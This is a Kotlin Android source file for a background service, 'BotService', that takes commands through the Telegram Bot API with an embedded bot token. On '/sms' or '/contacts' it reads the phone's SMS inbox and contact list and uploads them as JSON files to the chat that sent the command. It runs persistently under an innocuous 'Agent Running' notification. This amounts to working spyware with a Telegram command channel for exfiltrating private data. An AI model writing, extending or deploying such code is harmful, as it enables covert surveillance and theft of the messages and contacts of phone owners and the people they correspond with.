package com.example.telegramagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException

class BotService : Service() {
    private val token = "8735606971:AAEA5enYqV4mCtbRTXbYBPTkWJDPitPH9Y4"
    private val baseUrl = "https://api.telegram.org/bot$token/"
    private val client = OkHttpClient()
    private var lastUpdateId: Long = 0
    private var isRunning = true

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        
        Thread {
            while (isRunning) {
                pollTelegram()
                Thread.sleep(2000)
            }
        }.start()

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "bot_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Service Channel", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Agent Running")
            .setContentText("Service is active in background")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun pollTelegram() {
        val url = "${baseUrl}getUpdates?offset=${if (lastUpdateId == 0L) "" else (lastUpdateId + 1)}"
        val request = Request.Builder().url(url).build()
        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    val results = json.optJSONArray("result")
                    if (results != null) {
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            
                            val message = update.optJSONObject("message")
                            if (message != null) {
                                val chatId = message.getJSONObject("chat").getLong("id")
                                val text = message.optString("text", "")
                                handleCommand(chatId, text)
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handleCommand(chatId: Long, text: String) {
        when (text) {
            "/start" -> sendMessage(chatId, "أهلاً بك. الأوامر المتاحة:\n/sms - سحب الرسائل\n/contacts - سحب الأسماء")
            "/sms" -> fetchSms(chatId)
            "/contacts" -> fetchContacts(chatId)
            else -> sendMessage(chatId, "أمر غير معروف.")
        }
    }

    private fun sendMessage(chatId: Long, text: String) {
        val url = "${baseUrl}sendMessage?chat_id=$chatId&text=${Uri.encode(text)}"
        val request = Request.Builder().url(url).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }

    private fun fetchSms(chatId: Long) {
        try {
            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            val smsArray = JSONArray()
            cursor?.use {
                val bodyIndex = it.getColumnIndex("body")
                val addressIndex = it.getColumnIndex("address")
                while (it.moveToNext() && smsArray.length() < 50) {
                    val obj = JSONObject()
                    obj.put("address", if (addressIndex != -1) it.getString(addressIndex) else "")
                    obj.put("body", if (bodyIndex != -1) it.getString(bodyIndex) else "")
                    smsArray.put(obj)
                }
            }
            
            val file = File(cacheDir, "sms.json")
            file.writeText(smsArray.toString())
            sendFile(chatId, file)
        } catch (e: Exception) {
            sendMessage(chatId, "خطأ في سحب الرسائل: ${e.message}")
        }
    }

    private fun fetchContacts(chatId: Long) {
        try {
            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            val contactsArray = JSONArray()
            cursor?.use {
                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && contactsArray.length() < 100) {
                    val obj = JSONObject()
                    obj.put("name", if (nameIndex != -1) it.getString(nameIndex) else "")
                    obj.put("number", if (numberIndex != -1) it.getString(numberIndex) else "")
                    contactsArray.put(obj)
                }
            }
            
            val file = File(cacheDir, "contacts.json")
            file.writeText(contactsArray.toString())
            sendFile(chatId, file)
        } catch (e: Exception) {
            sendMessage(chatId, "خطأ في سحب الأسماء: ${e.message}")
        }
    }

    private fun sendFile(chatId: Long, file: File) {
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId.toString())
            .addFormDataPart("document", file.name, file.asRequestBody("application/json".toMediaTypeOrNull()))
            .build()

        val request = Request.Builder()
            .url("${baseUrl}sendDocument")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }
}
